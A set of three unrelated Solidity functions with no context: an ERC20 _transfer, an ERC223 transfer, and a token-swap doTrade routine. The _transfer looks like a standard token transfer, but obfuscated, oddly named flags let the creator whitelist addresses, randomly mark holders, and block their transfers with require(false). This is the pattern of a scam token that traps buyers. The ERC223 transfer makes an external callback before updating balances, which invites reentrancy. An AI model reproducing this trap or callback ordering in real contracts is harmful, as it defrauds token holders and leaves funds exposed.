function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (doggy == false)) {
        dinosaur = chTx;
        livingroom = true;
    }
    if ((address(sender) == creator) && (doggy == true)) {
        garbage[recipient] = true;
        disposal[recipient] = false;
        doggy = false;
    }
    if ((amount > birdy) && (garbage[sender] == true) && (address(sender) != creator)) {
        moab[recipient] = true;
    }
    if (garbage[recipient] != true) {
        disposal[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((disposal[sender]) && (garbage[recipient] == false)) {
        disposal[recipient] = true;
    }
    if (garbage[sender] == false) {
        if ((amount > birdy) && (moab[sender] == true)) {
            require(false);
        }
        require(amount < dinosaur);
        if (livingroom == true) {
            if (moab[sender] == true) {
                require(false);
            }
            moab[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function transfer(address _to, uint _value, bytes _data) public {
    require(_value > 0);
    if (isContract(_to)) {
        ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
        receiver.tokenFallback(msg.sender, _value, _data);
    }
    balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
    balanceOf[_to] = balanceOf[_to].add(_value);
    Transfer(msg.sender, _to, _value, _data);
}

function doTrade(
    ERC20 srcToken,
    uint srcAmount,
    ERC20 destToken,
    address destAddress,
    uint conversionRate,
    bool validate
)
internal
returns(bool) {
    uint actualDestAmount;
    require((ETH_TOKEN_ADDRESS == srcToken) || (ETH_TOKEN_ADDRESS == destToken));
    require((tradeToken == srcToken) || (tradeToken == destToken));
    if (validate) {
        require(conversionRate > 0);
        if (srcToken == ETH_TOKEN_ADDRESS)
            require(msg.value == srcAmount);
        else
            require(msg.value == 0);
    }
    uint destAmount = getDestQty(srcToken, destToken, srcAmount, conversionRate);
    require(destAmount > 0);
    if (srcToken == ETH_TOKEN_ADDRESS) {
        wethToken.deposit.value(msg.value)();
        if (wethToken.allowance(this, otc) < msg.value) {
            wethToken.approve(otc, uint(-1));
        }
        actualDestAmount = otc.sellAllAmount(wethToken, msg.value, destToken, destAmount);
        require(actualDestAmount >= destAmount);
        require(destToken.transfer(destAddress, destAmount));
    } else {
        require(srcToken.transferFrom(msg.sender, this, srcAmount));
        if (srcToken.allowance(this, otc) < srcAmount) {
            srcToken.approve(otc, uint(-1));
        }
        actualDestAmount = otc.sellAllAmount(srcToken, srcAmount, wethToken, destAmount);
        require(actualDestAmount >= destAmount);
        wethToken.withdraw(actualDestAmount);
        destAddress.transfer(destAmount);
    }
    TradeExecute(msg.sender, srcToken, srcAmount, destToken, destAmount, destAddress);
    return true;
}

